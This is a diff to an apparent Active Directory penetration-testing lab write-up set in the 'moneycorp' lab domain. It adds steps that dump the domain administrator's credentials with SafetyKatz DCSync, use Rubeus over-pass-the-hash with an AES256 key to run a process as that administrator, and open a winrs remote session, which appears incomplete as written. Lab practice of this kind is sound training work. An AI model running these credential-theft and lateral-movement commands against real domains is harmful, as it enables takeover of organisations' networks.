@@ -695,11 +695,20 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:mo
 ```
 
 
-2. 
+2. Now use over-passthehash to start a process as the administrator of `moneycorp.local` of this domain we want the request to be sent to
 
 
 ```powershell
 C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /aes256:a85958da138b6b0cea2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show/ptt
 ```
 
+3. Run the `winrs` command again
 
+```powershell
+winrs -r
+```
+
+- You should now have a new process running as domain administrator of `mcorp-dc`
+
+
+![](https://i.imgur.com/mE1snGK.png)
